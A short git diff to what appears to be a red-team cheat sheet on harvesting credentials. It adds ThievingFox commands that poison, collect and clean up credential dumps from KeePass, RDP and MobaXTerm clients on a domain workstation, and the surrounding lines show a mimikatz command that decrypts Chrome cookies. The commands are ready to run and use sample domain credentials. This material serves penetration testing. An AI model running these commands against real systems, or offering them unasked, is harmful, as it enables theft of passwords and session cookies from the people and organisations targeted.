@@ -55,6 +55,14 @@ Cookies for Azure are `ESTSAUTH`, `ESTSAUTHPERSISTENT` and `ESTSAUTHLIGHT`.
 mimikatz.exe "dpapi::chrome /in:%localappdata%googlechromeUSERDA~1defaultcookies /unprotect" exit
 ~~~
 
+Dump credentials from various sources like KeePass, KeePassXC, mstsc, RDCMan and MobaXTerm with [ThievingFox](https://github.com/Slowerzs/ThievingFox/).
+
+~~~ bash
+thievingfox poison --all corp.local/jdoeadm:'passw0rd'@ws01.corp.local
+thievingfox collect --all corp.local/jdoeadm:'passw0rd'@ws01.corp.local
+thievingfox cleanup --all corp.local/jdoeadm:'passw0rd'@ws01.corp.local
+~~~
+
 Untested tools:
 
 - [pandora](https://github.com/efchatz/pandora), dumps credentials from various password manager Chrome plugins like 1Password, Bitwarden and LastPass
